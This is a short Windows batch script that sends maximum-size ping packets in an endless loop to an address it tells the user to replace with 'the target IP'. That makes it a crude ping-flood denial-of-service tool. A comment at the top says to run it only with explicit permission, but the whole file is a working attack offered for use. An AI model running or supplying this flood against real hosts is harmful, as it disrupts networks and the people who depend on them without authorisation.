REM only run on computers and networks that you have explicit permission to attack
:loop
ping 192.168.1.1 -l 65500 -w 1 -n 1 
REM change IP to the target IP
goto :loop